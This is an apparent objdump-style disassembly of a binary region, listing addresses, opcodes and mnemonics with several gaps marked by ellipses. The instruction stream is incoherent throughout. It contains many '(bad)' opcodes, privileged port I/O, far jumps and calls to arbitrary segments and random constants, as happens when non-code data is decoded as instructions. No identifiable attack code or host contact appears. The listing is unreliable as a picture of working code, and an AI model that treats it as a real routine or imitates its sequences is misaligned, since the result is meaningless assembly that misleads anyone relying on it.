  42254b:	les    esp,FWORD PTR [eax-0x4d]
  42254e:	sti    
  42254f:	dec    esi
  422550:	call   0x9a178f48
  422555:	imul   ebx,DWORD PTR ds:0xa1bbb22,0x6a7fb1cf
  42255f:	add    ebx,DWORD PTR [bx+di-0x55]
  422563:	fstp   DWORD PTR [ebx+esi*8+0x22]
  422567:	inc    esi
  422568:	fldenv [eax-0x42]
  42256b:	jo     0x42251a
  42256d:	push   esp
  42256e:	mov    ecx,0x3c4ae8a1
  422573:	jo     0x4225a2
  422575:	pushf  
  422576:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422577:	test   al,0xc1
  422579:	pop    es
  42257a:	push   ds
  42257b:	push   eax
  42257c:	fld    TBYTE PTR [esi+0x7909c2c7]
  422582:	or     al,0x3e
  422584:	and    eax,0xb487d4bd
  422589:	aas    
  42258a:	dec    edx
  42258b:	xchg   esi,eax
  42258c:	mov    bl,0x9
  42258e:	mov    DWORD PTR [ebp+0x0],edi
	...
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x7e15d08]
  422602:	ror    DWORD PTR [ecx+0x16e44],1
  422608:	add    al,0x1
  42260a:	add    BYTE PTR [eax],al
  42260c:	adc    cl,bl
  42260e:	and    esp,DWORD PTR [ebp-0xd34f103]
  422614:	and    ch,BYTE PTR [edx]
  422616:	or     bh,BYTE PTR [ecx]
  422618:	push   edi
  422619:	les    edx,FWORD PTR [esi-0x1b]
  42261c:	js     0x42264f
  42261e:	and    dh,0x2f
  422621:	mov    ah,0x42
  422623:	stos   DWORD PTR es:[edi],eax
  422624:	jno    0x42263a
  422626:	inc    ecx
  422627:	retf   0x13b5
  42262a:	mov    al,0x9e
  42262c:	push   ebp
  42262d:	std    
  42262e:	rcl    DWORD PTR ds:0x16742ba6,0x92
  422635:	xchg   ebx,eax
  422636:	in     al,0x17
  422638:	test   BYTE PTR [ecx-0x48],0xb2
  42263c:	retf   
  42263d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42263f:	or     al,0xae
  422641:	cmp    edx,DWORD PTR [ecx]
  422643:	sub    edx,esp
  422645:	sar    BYTE PTR [ebx+0x2d],0x15
  422649:	push   esi
  42264a:	sbb    dh,bl
  42264c:	add    ch,ch
  42264e:	popf   
  42264f:	adc    eax,0xc04ad3ba
  422654:	push   0xef7869d
  422659:	jo     0x422625
  42265b:	cwde   
  42265c:	xor    DWORD PTR [ecx-0x44],edi
  42265f:	mov    ecx,ss
  422661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422662:	xor    eax,0xb9502c27
  422667:	(bad)  
  422668:	mov    cl,0xa0
  42266a:	sbb    BYTE PTR [ebx],ch
  42266c:	pushf  
  42266d:	and    al,BYTE PTR [ebx-0x24dcea5c]
  422673:	xor    ch,al
  422675:	stos   DWORD PTR es:[edi],eax
  422676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422677:	inc    ebp
  422678:	inc    esi
  422679:	jno    0x42263e
  42267b:	nop
  42267c:	test   al,0x66
  42267e:	and    al,0xd
  422680:	push   cs
  422681:	dec    edx
  422682:	mov    eax,ds:0xa77c0406
  422688:	pop    ebx
  422689:	cmp    edi,DWORD PTR [esi+0x2d8f0baf]
  42268f:	inc    esi
  422690:	push   ss
  422691:	and    ebx,DWORD PTR [esi-0xb]
  422694:	dec    esp
  422695:	inc    ecx
  422696:	fidiv  DWORD PTR [edi+0x7c]
  422699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269a:	push   es
  42269b:	add    DWORD PTR [ecx+0x42],eax
  42269e:	in     al,0x67
  4226a0:	or     DWORD PTR [edx-0x73],0x1b
  4226a4:	lahf   
  4226a5:	jmp    0xc407:0x4f1dd26a
  4226ac:	jne    0x422640
  4226ae:	inc    ecx
  4226af:	mov    ecx,0x98ce8442
  4226b4:	hlt    
  4226b5:	and    al,0x5e
  4226b7:	add    BYTE PTR ds:0x20396c67,bh
  4226bd:	and    dh,bh
  4226bf:	gs pop ebx
  4226c1:	into   
  4226c2:	mov    al,ds:0x9ca5294d
  4226c7:	aas    
  4226c8:	loope  0x4226f4
  4226ca:	repnz xor DWORD PTR [edx-0x8396d02],esp
  4226d1:	dec    ebp
  4226d2:	cld    
  4226d3:	enter  0x691,0x5a
  4226d7:	cmp    eax,0xca98c41a
  4226dc:	loop   0x42273e
  4226de:	fcomp  DWORD PTR [ebp+0x7b]
  4226e1:	or     BYTE PTR [eax],0x71
  4226e4:	mov    cs,esp
  4226e6:	adc    BYTE PTR [esi+0x6fd71554],ah
  4226ec:	daa    
  4226ed:	adc    eax,0x6691bd80
  4226f2:	jo     0x422696
  4226f4:	cdq    
  4226f5:	mov    al,0x38
  4226f7:	fmul   QWORD PTR ds:0x41d4
  4226fc:	call   0x32310cc0
  422701:	mov    cl,0xed
  422703:	fmulp  st(1),st
  422705:	js     0x42274a
  422707:	test   BYTE PTR [ebp-0x21e5bc46],bl
  42270d:	in     eax,dx
  42270e:	(bad)  
  42270f:	scas   al,BYTE PTR es:[edi]
	...
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x737f01c8
  422781:	nop
  422782:	dec    ebx
  422783:	or     BYTE PTR [eax+0x6f],0x1
  422787:	add    BYTE PTR [ecx+eax*1],al
  42278a:	add    BYTE PTR [eax],al
  42278c:	adc    edi,DWORD PTR ds:0x4637747e
  422792:	mov    esi,0x4aaeb9bc
  422797:	inc    esp
  422798:	mov    dl,0x85
  42279a:	(bad)  
  42279b:	mov    eax,ds:0x82f1f0f6
  4227a0:	bound  ebp,QWORD PTR [eax]
  4227a2:	push   esi
  4227a3:	push   0x4d
  4227a5:	arpl   bx,ax
  4227a7:	jle    0x422763
  4227a9:	leave  
  4227aa:	mov    edi,0x894e52b0
  4227af:	add    ebx,DWORD PTR [ecx]
  4227b1:	les    ebx,FWORD PTR [edi+ebp*4-0x7d]
  4227b5:	fucomip st,st(7)
  4227b7:	mov    DWORD PTR [edx+eax*8],edi
  4227ba:	test   eax,0xf0eb976a
  4227bf:	pop    ss
  4227c0:	std    
  4227c1:	das    
  4227c2:	ds mov cl,0x47
  4227c5:	out    0x53,eax
  4227c7:	enter  0xe616,0x9b
  4227cb:	lods   eax,DWORD PTR ds:[esi]
  4227cc:	or     BYTE PTR [ebp+0x5c],0x10
  4227d0:	cmp    DWORD PTR [edx+esi*4],ebp
  4227d3:	sbb    BYTE PTR [edx-0x65a56895],al
  4227d9:	std    
  4227da:	add    dh,BYTE PTR [ebp+0x5619a71c]
  4227e0:	dec    edi
  4227e1:	pop    esp
  4227e2:	icebp  
  4227e3:	pop    eax
  4227e4:	mov    esp,DWORD PTR [edx+0x21a7f76f]
  4227ea:	dec    esi
  4227eb:	mov    dh,0xc6
  4227ed:	loop   0x422849
  4227ef:	push   ebx
  4227f0:	sub    dh,BYTE PTR [ebx-0x7e590899]
  4227f6:	sub    bh,BYTE PTR [edi-0x17]
  4227f9:	rol    ah,cl
  4227fb:	add    eax,0xfc879c40
  422800:	in     eax,dx
  422801:	inc    ecx
  422802:	test   ah,0x11
  422805:	push   cs
  422806:	test   al,0xa1
  422808:	push   cs
  422809:	(bad)  
  42280a:	push   edi
  42280b:	add    BYTE PTR [ebx],dh
  42280d:	xchg   ebx,eax
  42280e:	retf   0x14e0
  422811:	add    dh,bh
  422813:	fcomp  st(0)
  422815:	pop    ebp
  422816:	imul   ebp,DWORD PTR [ebx-0x2a128a5c],0xfffffff2
  42281d:	jge    0x4227dc
  42281f:	cmp    BYTE PTR [edi-0x12],bh
  422822:	enter  0x3f49,0x56
  422826:	lahf   
  422827:	pop    edi
  422828:	outs   dx,DWORD PTR ds:[esi]
  422829:	sub    eax,0xa2f38f82
  42282e:	adc    DWORD PTR [esi-0x54],edx
  422831:	daa    
  422832:	shr    BYTE PTR [esi-0x6ffd9fd5],cl
  422838:	enter  0xaa50,0x48
  42283c:	dec    ebp
  42283d:	dec    edi
  42283e:	and    DWORD PTR ds:0xff72bfd,0xffffffde
  422845:	pop    ecx
  422846:	jns    0x42283b
  422848:	sbb    ah,dl
  42284a:	aaa    
  42284b:	pusha  
  42284c:	sub    BYTE PTR [edx],bl
  42284e:	std    
  42284f:	xchg   DWORD PTR [eax*4-0x2e0872dc],ebp
  422856:	and    edi,eax
  422858:	push   ds
  422859:	mov    ch,0xe1
  42285b:	jbe    0x422850
  42285d:	push   edx
  42285e:	mov    bl,0xee
  422860:	repnz and eax,0x6510ae33
  422866:	stc    
  422867:	mov    dh,0x68
  422869:	jbe    0x422863
  42286b:	repz sub ebp,edi
  42286e:	push   ds
  42286f:	dec    ecx
  422870:	and    eax,eax
  422872:	xor    al,0x2e
  422874:	mov    al,ds:0x3ce03e36
  422879:	clc    
  42287a:	xchg   DWORD PTR [ebx+0x26de9aa2],ebp
  422880:	jmp    0x62ce:0x403b7023
  422887:	int    0x44
  422889:	iret   
  42288a:	add    ebx,esp
  42288c:	pop    es
  42288d:	clc    
  42288e:	sbb    eax,0x56
	...
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422906
  422901:	and    DWORD PTR es:[ebx],eax
  422904:	dec    esp
  422905:	jo     0x422908
  422907:	add    BYTE PTR [ecx+eax*1],al
  42290a:	add    BYTE PTR [eax],al
  42290c:	jb     0x422915
  42290e:	mov    ds:0xac89cc41,al
  422913:	fdiv   st(2),st
  422915:	push   es
  422916:	mov    ebx,0x4e558c9d
  42291b:	sti    
  42291c:	data16 icebp 
  42291e:	adc    DWORD PTR [esi+0x1a],ebx
  422921:	dec    ecx
  422922:	push   esp
  422923:	cmp    DWORD PTR [eax+0x80fdc5],ebp
  422929:	sub    eax,0x301c9af7
  42292e:	or     bh,bh
  422930:	adc    DWORD PTR [edi-0x3be54f86],ecx
  422936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422937:	jb     0x422951
  422939:	add    dh,al
  42293b:	sbb    al,0x5c
  42293d:	jmp    0xf9632cd7
  422942:	adc    BYTE PTR [eax+0xe],cl
  422945:	jge    0x4228f8
  422947:	dec    esi
  422948:	xor    esi,DWORD PTR [ecx+0x46]
  42294b:	mov    ds:0x627191b5,al
  422950:	mov    ah,0x6
  422952:	es add al,0x37
  422955:	ins    DWORD PTR es:[edi],dx
  422956:	jae    0x422966
  422958:	adc    eax,0xbfcc3d32
  42295d:	push   ebx
  42295e:	aas    
  42295f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422960:	sar    edi,1
  422962:	dec    edx
  422963:	mov    ebp,0xa16eb8f4
  422968:	popa   
  422969:	cmp    al,0x3b
  42296b:	mov    al,ds:0xc48a6b92
  422970:	call   0x5981:0x71c94769
  422977:	outs   dx,DWORD PTR ds:[esi]
  422978:	and    dh,ch
  42297a:	mov    ah,0x4b
  42297c:	push   edx
  42297d:	nop
  42297e:	into   
  42297f:	rcl    DWORD PTR [ebp+0x151107cf],1
  422985:	in     eax,dx
  422986:	scas   eax,DWORD PTR es:[edi]
  422987:	sbb    eax,ecx
  422989:	(bad)  
  42298a:	aam    0x35
  42298c:	mov    al,BYTE PTR [edi+0x7c]
  42298f:	aad    0xbf
  422991:	sbb    eax,0xefcba5ce
  422996:	loope  0x422941
  422998:	lods   eax,DWORD PTR ds:[esi]
  422999:	xchg   ebp,eax
  42299a:	test   eax,0x86906139
  42299f:	aad    0x57
  4229a1:	in     al,0x6
  4229a3:	es xor bl,0xb
  4229a7:	jo     0x42293e
  4229a9:	sbb    eax,0x120703be
  4229ae:	mov    eax,ds:0xda461261
  4229b3:	or     DWORD PTR [edi+0x4f],esp
  4229b6:	mov    ds:0x62786d29,al
  4229bb:	sub    ebp,DWORD PTR [edi]
  4229bd:	rcl    BYTE PTR [ebp-0x58],0xae
  4229c1:	mov    eax,ds:0xaf30b123
  4229c6:	mov    eax,?
  4229c8:	dec    edi
  4229c9:	loopne 0x4229d8
  4229cb:	mov    cl,0x63
  4229cd:	dec    ebp
  4229ce:	add    al,0xcd
  4229d0:	cmp    BYTE PTR [ecx+0x21],ch
  4229d3:	or     BYTE PTR [eax+eiz*8],0x4a
  4229d7:	les    esp,FWORD PTR [ebx-0x44]
  4229da:	mov    eax,0xc2e169bf
  4229df:	sub    dl,BYTE PTR [esp+eiz*8]
  4229e2:	dec    eax
  4229e3:	cwde   
  4229e4:	adc    ebx,DWORD PTR [ebx-0x5ff6b602]
  4229ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229eb:	adc    cl,BYTE PTR [edx+0x2fff64ff]
  4229f1:	sti    
  4229f2:	adc    BYTE PTR [edx-0x75],bh
  4229f5:	js     0x4229a3
  4229f7:	push   eax
  4229f8:	rcr    esp,0x52
  4229fb:	into   
  4229fc:	add    ch,bh
  4229fe:	fiadd  WORD PTR [ebp-0x1c042f2c]
  422a04:	es and eax,0x1a241807
  422a0a:	mov    edi,0x1d47e60d
  422a0f:	outs   dx,BYTE PTR ds:[esi]
	...
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	sbb    al,0x1e
  422a82:	lahf   
  422a83:	dec    esi
  422a84:	push   eax
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR [ecx+eax*1],al
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	int    0x85
  422a8e:	sbb    al,0x68
  422a90:	fsubr  DWORD PTR [edi-0x365fe6ec]
  422a96:	fistp  DWORD PTR [edi+0x22]
  422a99:	push   esp
  422a9a:	push   ebx
  422a9b:	ja     0x422ac8
  422a9d:	aad    0x88
  422a9f:	xchg   edi,eax
  422aa0:	cmp    ebp,DWORD PTR [esi-0x21]
  422aa3:	arpl   WORD PTR ds:0x23618569,si
  422aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422aaa:	cs (bad) 
  422aac:	jp     0x422a71
  422aae:	mul    BYTE PTR [ecx-0x1f32320d]
  422ab4:	push   esi
  422ab5:	inc    esi
  422ab6:	dec    eax
  422ab7:	or     edi,DWORD PTR [edx-0xe]
  422aba:	pop    esp
  422abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422abc:	jne    0x422ae0
  422abe:	adc    edi,DWORD PTR [ebx]
  422ac0:	jmp    0x422acb
  422ac2:	inc    esi
  422ac3:	dec    edi
  422ac4:	lock int 0x4e
  422ac7:	pusha  
  422ac8:	pop    edx
  422ac9:	mov    edx,DWORD PTR ds:0xdc5fbb5f
  422acf:	adc    DWORD PTR [eax+0x79d18621],0x7c141241
  422ad9:	adc    al,0xb9
  422adb:	repnz and al,0xe0
  422ade:	hlt    
  422adf:	or     al,0xa8
  422ae1:	inc    edx
  422ae2:	push   ds
  422ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ae4:	call   0x711922c9
  422ae9:	dec    ecx
  422aea:	inc    ecx
  422aeb:	dec    eax
  422aec:	pop    ebp
  422aed:	bound  ebp,QWORD PTR [ecx+0x65]
  422af0:	(bad)  
  422af1:	cld    
  422af2:	sub    eax,0xb751489d
  422af7:	mov    ds:0x13a98f,al
  422afc:	je     0x422b59
  422afe:	mov    DWORD PTR fs:[edi-0x1c],edx
  422b02:	add    ch,dh
  422b04:	add    BYTE PTR [ecx+0x3563fe0c],0x10
  422b0b:	bound  ebp,QWORD PTR [edx]
  422b0d:	call   0xefb9:0x8a3af07d
  422b14:	nop
  422b15:	adc    al,BYTE PTR [eax-0x53]
  422b18:	into   
  422b19:	enter  0xb9c5,0x5
  422b1d:	xlat   BYTE PTR ds:[ebx]
  422b1e:	pop    ebp
  422b1f:	pop    eax
  422b20:	push   ds
  422b21:	dec    edx
  422b22:	dec    ebp
  422b23:	mov    esi,0x6a169307
  422b28:	(bad)
  422b2b:	int    0x2a
  422b2d:	int    0xd0
  422b2f:	jb     0x422b83
  422b31:	dec    edx
  422b32:	sbb    dl,BYTE PTR [edi+0x6c767b34]
  422b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b39:	sub    BYTE PTR [ebx],bl
  422b3b:	lock bound ebp,QWORD PTR [edi-0x29]
  422b3f:	cmp    DWORD PTR [ecx+0x2ce6d9dd],ecx
  422b45:	fwait
  422b46:	cmp    edx,DWORD PTR [edi+0x71]
  422b49:	gs jbe 0x422b1c
  422b4c:	pusha  
  422b4d:	int    0x38
  422b4f:	dec    ecx
  422b50:	push   es
  422b51:	loopne 0x422b3c
  422b53:	and    ecx,ebp
  422b55:	sub    bl,BYTE PTR [edi]
  422b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b58:	jg     0x422bd7
  422b5a:	inc    esi
  422b5b:	mov    al,0xa9
  422b5d:	mov    esp,0xf135f14a
  422b62:	add    edi,esp
  422b64:	inc    ebp
  422b65:	xchg   ebp,eax
  422b66:	ficomp WORD PTR [eax+0x69]
  422b69:	pop    esp
  422b6a:	mov    eax,ds:0xdef290ae
  422b6f:	lods   al,BYTE PTR ds:[esi]
  422b70:	daa    
  422b71:	pop    esp
  422b72:	fnsave [edx+0x3de355e3]
  422b78:	xor    BYTE PTR [edi-0x754a9df7],0x91
  422b7f:	push   edx
  422b80:	jne    0x422b89
  422b82:	fcomi  st,st(3)
  422b84:	test   eax,0xb4dc4976
  422b89:	rol    DWORD PTR [esi],0x3c
  422b8c:	jo     0x422bad
  422b8e:	fist   WORD PTR [edi+0x0]
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx+0x108b4d9c]
  422c02:	xor    BYTE PTR [esp+edx*2+0x72],al
  422c06:	add    DWORD PTR [eax],eax
  422c08:	add    al,0x1
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	pop    ebp
  422c0d:	out    0x30,al
  422c0f:	mov    BYTE PTR [eax+0x39],ch
  422c12:	xchg   esp,eax
  422c13:	mov    al,BYTE PTR [edi]
  422c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c16:	bound  eax,QWORD PTR [edi-0x5c]
  422c19:	pop    ss
  422c1a:	out    dx,al
  422c1b:	mov    bl,0x26
  422c1d:	mov    al,ds:0x1df7993
  422c22:	mov    esp,DWORD PTR [ecx]
  422c24:	cmp    al,BYTE PTR [esi-0x5e0121b4]
  422c2a:	mov    eax,ds:0x2bb17a2d
  422c2f:	repnz push 0x5d7ddf19
  422c35:	xlat   BYTE PTR ds:[ebx]
  422c36:	(bad)  
  422c37:	fwait
  422c38:	sbb    al,0x73
  422c3a:	out    0x2b,eax
  422c3c:	mov    eax,ds:0x39cf8e17
  422c41:	xchg   DWORD PTR [esi+0x79a43cb3],esp
  422c47:	xchg   edi,eax
  422c48:	jbe    0x422cc5
  422c4a:	pushf  
  422c4b:	push   ebx
  422c4c:	mov    cl,0x2b
  422c4e:	cmp    DWORD PTR [edi-0x4c],edi
  422c51:	cmp    dh,0x54
  422c54:	ret    
  422c55:	jbe    0x422cb3
  422c57:	fcmovne st,st(0)
  422c59:	adc    eax,0x4dc3de7f
  422c5e:	test   eax,0x4e6b38cd
  422c63:	in     al,0xd1
  422c65:	dec    edx
  422c66:	dec    ecx
  422c67:	loop   0x422c32
  422c69:	sub    DWORD PTR [ecx+eax*2],ebx
  422c6c:	popf   
  422c6d:	and    BYTE PTR [eax],bl
  422c6f:	stc    
  422c70:	scas   al,BYTE PTR es:[edi]
  422c71:	dec    ebx
  422c72:	inc    ecx
  422c73:	aad    0xb7
  422c75:	out    dx,eax
  422c76:	jg     0x422c44
  422c78:	(bad)  
  422c7a:	cmp    BYTE PTR [edx],bl
  422c7c:	in     eax,dx
  422c7d:	jo     0x422cf9
  422c7f:	pop    ebx
  422c80:	cmp    DWORD PTR [edi],eax
  422c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c83:	in     eax,dx
  422c84:	add    cl,BYTE PTR [ebp+esi*1-0x518c930b]
  422c8b:	lahf   
  422c8c:	cmc    
  422c8d:	addr16 out dx,al
  422c8f:	sti    
  422c90:	mov    dh,0xbb
  422c92:	inc    ebp
  422c93:	imul   esp,DWORD PTR [edx],0x3b
  422c96:	sub    ah,bl
  422c98:	shl    edi,0x82
  422c9b:	mov    dh,0xaa
  422c9d:	or     eax,0xed78e30c
  422ca2:	pop    ss
  422ca3:	test   eax,0x11235b95
  422ca8:	mov    ds,WORD PTR [ebx]
  422caa:	loope  0x422cd2
  422cac:	pop    ecx
  422cad:	mov    ebp,0xfe67b409
  422cb2:	inc    ecx
  422cb3:	lods   al,BYTE PTR ds:[esi]
  422cb4:	adc    DWORD PTR [eax-0x47bb8fbd],esi
  422cba:	clc    
  422cbb:	cmp    edx,esp
  422cbd:	aaa    
  422cbe:	sub    ah,BYTE PTR [eax+0x11]
  422cc1:	push   ebp
  422cc2:	mov    esi,0xd1b2dc2e
  422cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cc8:	xor    ch,dl
  422cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ccb:	jmp    0xd7924f06
  422cd0:	inc    edi
  422cd1:	loope  0x422ca6
  422cd3:	out    dx,al
  422cd4:	push   ss
  422cd5:	adc    eax,0x16ce5ff2
  422cda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cdb:	lods   eax,DWORD PTR ds:[esi]
  422cdc:	out    dx,al
  422cdd:	jo     0x422ca6
  422cdf:	jge    0x422d45
  422ce1:	enter  0xa6f3,0x87
  422ce5:	mov    eax,0x9f0be7da
  422cea:	rcr    edi,0xad
  422ced:	sub    BYTE PTR [ebx],dl
  422cef:	push   ebp
  422cf0:	and    bh,BYTE PTR [edi]
  422cf2:	inc    edi
  422cf3:	adc    DWORD PTR [eax-0x7977ac81],ebp
  422cf9:	sar    edi,1
  422cfb:	jl     0x422d53
  422cfd:	jne    0x422d33
  422cff:	loop   0x422d80
  422d01:	xor    DWORD PTR [eax+0x3a],esi
  422d04:	test   al,0xaf
  422d07:	pop    ecx
  422d08:	bound  ecx,QWORD PTR [eax-0x1ace8c39]
  422d0e:	xchg   edi,eax
  422d0f:	rol    DWORD PTR [eax],1
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    edi,eax
  422d81:	shr    BYTE PTR [edi],1
  422d83:	mov    ebx,0x17358
  422d88:	add    al,0x1
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	sub    DWORD PTR [edx*4-0x687cd674],0x58
  422d94:	in     eax,dx
  422d95:	in     eax,dx
  422d96:	cli    
  422d97:	neg    DWORD PTR [edx-0x77]
  422d9a:	adc    DWORD PTR [ecx],ebx
  422d9c:	pop    ss
  422d9d:	add    BYTE PTR [ebx+eax*2+0x1c25d706],dh
  422da4:	mov    ch,0xaf
  422da6:	pop    ss
  422da7:	clc    
  422da8:	dec    ebp
  422da9:	ins    BYTE PTR es:[edi],dx
  422daa:	sub    ecx,edi
  422dac:	ret    
  422dad:	sub    eax,0x4178768e
  422db2:	mov    eax,ds:0x82921a2
  422db7:	mov    al,ds:0x927111a
  422dbc:	pusha  
  422dbd:	fimul  DWORD PTR [eax+0x372b4dc]
  422dc3:	jl     0x422dbd
  422dc5:	cmp    edi,ecx
  422dc7:	std    
  422dc8:	jmp    0x55e4:0x1ab066c4
  422dcf:	pop    esp
  422dd0:	or     DWORD PTR [eax-0x67],ebx
  422dd3:	out    dx,al
  422dd4:	in     eax,dx
  422dd5:	ret    0x54a
  422dd8:	add    BYTE PTR [esi],dh
  422dda:	das    
  422ddb:	out    dx,eax
  422ddc:	sahf   
  422ddd:	enter  0x3a4c,0x1a
  422de1:	aam    0x97
  422de3:	sbb    ch,BYTE PTR [ebx+0x66]
  422de6:	mov    ch,0x7c
  422de8:	rol    DWORD PTR ss:[esi],0xcb
  422dec:	inc    ebx
  422ded:	jl     0x422e04
  422def:	xor    eax,0xced57154
  422df4:	and    al,0xfc
  422df6:	scas   eax,DWORD PTR es:[edi]
  422df7:	pop    eax
  422df8:	inc    ecx
  422df9:	stc    
  422dfa:	jmp    0xbe98:0xfe0a926e
  422e01:	adc    bh,dl
  422e03:	push   edx
  422e04:	fld    TBYTE PTR [edx]
  422e06:	lahf   
  422e07:	sbb    BYTE PTR [edi],0x51
  422e0a:	adc    al,0x10
  422e0c:	pop    ss
  422e0d:	inc    esp
  422e0e:	ror    esi,cl
  422e10:	shl    DWORD PTR [eax-0x42391e8e],1
  422e16:	ror    BYTE PTR [edi+0x7f],cl
  422e19:	xor    edi,eax
  422e1b:	outs   dx,DWORD PTR ds:[esi]
  422e1d:	sbb    DWORD PTR [edx-0x1d],eax
  422e20:	es add eax,0x6e68e779
  422e26:	repz mov ebp,0x3b0e2bd1
  422e2c:	inc    edi
  422e2d:	aam    0x2c
  422e2f:	arpl   WORD PTR [esi+ebx*8-0x4f],di
  422e33:	inc    esp
  422e34:	push   ds
  422e35:	jmp    0x34348592
  422e3a:	shl    edi,cl
  422e3c:	loope  0x422e08
  422e3e:	mov    bh,0xd8
  422e40:	fs mov eax,0xb8f2ed06
  422e46:	push   ds
  422e47:	xchg   edx,eax
  422e48:	jmp    0x4a57:0x86e49f76
  422e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e50:	loopne 0x422e2e
  422e52:	cmp    ecx,ebx
  422e54:	mov    ebp,0xecdefbc
  422e59:	call   0xaf57bf41
  422e5e:	xchg   BYTE PTR [edx+0x2f62e459],dh
  422e64:	fisttp DWORD PTR [esi+eiz*8-0x25]
  422e68:	lods   eax,DWORD PTR ds:[esi]
  422e69:	inc    ebp
  422e6b:	mov    eax,ds:0x1293e595
  422e70:	int3   
  422e71:	daa    
  422e72:	mov    edx,0x766a1f56
  422e77:	jl     0x422e0e
  422e79:	aad    0x73
  422e7b:	and    edi,DWORD PTR [edi-0x6b]
  422e7e:	out    0x34,al
  422e80:	aad    0x89
  422e82:	add    BYTE PTR [esi],dh
  422e84:	jne    0x422e2a
  422e86:	das    
  422e87:	and    esi,ecx
  422e89:	sub    DWORD PTR [ecx+eiz*1+0x317c0221],0x0
	...
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0xcfe4ca33
  422f02:	or     al,0x92
  422f04:	pop    esp
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR [ecx+eax*1],al
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	xchg   ebp,eax
  422f0d:	and    DWORD PTR [eax],edx
  422f0f:	dec    esi
  422f10:	call   0xdf9eaffe
  422f15:	mov    eax,ds:0x57dfc95f
  422f1a:	adc    al,0x28
  422f1c:	call   esp
  422f1e:	cmp    al,0xda
  422f20:	xchg   ebx,eax
  422f21:	(bad)  
  422f22:	mov    dh,0x8b
  422f24:	lods   eax,DWORD PTR ds:[esi]
  422f25:	out    dx,al
  422f26:	pop    edi
  422f27:	cmp    eax,0x3d0c18d2
  422f2c:	adc    al,0x8b
  422f2e:	fld    QWORD PTR [esi]
  422f30:	ret    
  422f31:	mov    WORD PTR [ebx+0x74321673],fs
  422f37:	ins    BYTE PTR es:[edi],dx
  422f38:	fidivr DWORD PTR [ebp+0x674828a0]
  422f3e:	and    esp,ebx
  422f40:	mov    BYTE PTR [esi+eax*2+0x27],dh
  422f44:	dec    edi
  422f45:	sbb    DWORD PTR [ebx],edi
  422f47:	and    DWORD PTR [edi-0x48],0xa2b8fdd9
  422f4e:	mov    esi,0xabda3290
  422f53:	mov    eax,ds:0xc87e9f7a
  422f58:	call   0x12a2:0x728d3a89
  422f5f:	loope  0x422ee1
  422f61:	mov    al,0x1c
  422f63:	pop    ebx
  422f64:	sbb    eax,0x75214517
  422f69:	icebp  
  422f6a:	cli    
  422f6b:	pop    esi
  422f6c:	sub    al,0xa3
  422f6e:	les    eax,FWORD PTR [ebx+0x1c]
  422f71:	push   ds
  422f72:	je     0x422f6a
  422f74:	push   ebx
  422f75:	je     0x422ef8
  422f77:	out    0x59,eax
  422f79:	out    0x9c,al
  422f7b:	cmp    DWORD PTR [ecx+edi*2+0x13bae57],0xffffff85
  422f83:	popf   
  422f84:	(bad)  
  422f85:	sbb    DWORD PTR [edx+ecx*4],ebp
  422f88:	add    DWORD PTR [edx-0x6cbb0971],eax
  422f8e:	ss daa 
  422f90:	sub    cl,al
  422f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f93:	mov    esp,0xb57da042
  422f98:	cmc    
  422f99:	jmp    0x422f53
  422f9b:	xchg   edi,eax
  422f9c:	pop    ss
  422f9d:	mov    WORD PTR [esi+0x1f09f9fb],gs
  422fa3:	jecxz  0x422f41
  422fa5:	mov    al,ds:0x71792bfe
  422faa:	and    DWORD PTR [edx+0x62dd4d80],ecx
  422fb0:	push   esi
  422fb1:	out    0xdc,eax
  422fb3:	repnz les ebp,FWORD PTR [eax-0x754bb8ae]
  422fba:	inc    esi
  422fbb:	popa   
